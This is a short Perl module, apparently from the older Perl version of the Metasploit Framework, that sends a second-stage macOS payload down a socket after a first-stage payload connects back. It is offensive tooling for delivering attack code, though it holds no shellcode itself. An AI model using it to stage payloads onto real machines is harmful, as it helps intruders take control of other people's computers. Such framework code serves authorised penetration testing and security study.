package Msf::PayloadComponent::OSXStagePayload;
use strict;
use vars qw{@ISA};

sub _Import {
  my $class = shift;
  @ISA = ();
  foreach (@_) {
    eval("use $_");
    unshift(@ISA, $_);
  }
}

sub OSXStagePayload {
  my $self = shift;
  return($self->_Info->{'OSXStagePayload'});
  
}

sub HandleConnection {
  my $self = shift;
  $self->SUPER::HandleConnection;
  my $sock = $self->SocketOut;
  my $blocking = $sock->blocking;
  $sock->blocking(1);

  my $payload = $self->BuildOSX($self->OSXStagePayload);
  $self->PrintLine('[*] Sending Stage (' . length($payload) . ' bytes)');
  eval { $sock->send($payload); };
  
  $self->PrintDebugLine(3, '[*] Stage Sent.');
  $sock->blocking($blocking);
}

1;
